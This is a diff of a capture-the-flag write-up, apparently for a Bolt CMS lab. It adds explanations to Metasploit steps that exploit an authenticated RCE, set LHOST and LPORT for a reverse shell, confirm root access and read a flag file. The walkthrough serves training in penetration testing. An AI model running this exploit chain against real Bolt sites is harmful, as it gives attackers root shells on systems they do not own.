@@ -441,8 +441,8 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) >
 18. `set USERNAME {JAKE'S USERNAME}` to set the value of the **USERNAME** variable to the target's admin username
 19. `set LHOST {MACHINE IP}` to set the value of the **LHOST** variable to our attack machine's IP address
 20. `set LPORT {PORT NUMBER}` to set the value of the **LPORT** variable to an unused port on our attack machine
-21. `show options`
-22. `exploit`
+21. `show options` to display the new configuration settings that we made for this module to verify that we have provided the correct necessary information that this it needs to properly execute
+22. `exploit` to execute the exploit against our target, which ended up spawning in a reverse shell our target (RHOSTS) that connected back to to our attack machine (LHOST) on the local port (LPORT) that we specified
 ```bash
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
 PASSWORD => boltadmin123
@@ -528,9 +528,9 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
 [+] Reverted user profile back to original state.
 
 ```
-23. `whoami`
-24. `find / -type f -name flag.txt 2>/dev/null`
-25. `cat {FLAG TEXT PATH}`
+23. `whoami` to display who we're running as onto our terminal, which revealed that we were running as root
+24. `find / -type f -name flag.txt 2>/dev/null` to recursively search for the flag.txt file starting from the root of the target's filesystem and display its location onto our terminal
+25. `cat {FLAG TEXT PATH}` to display contents of the flag.txt file onto our terminal
 ```bash
 whoami
 root
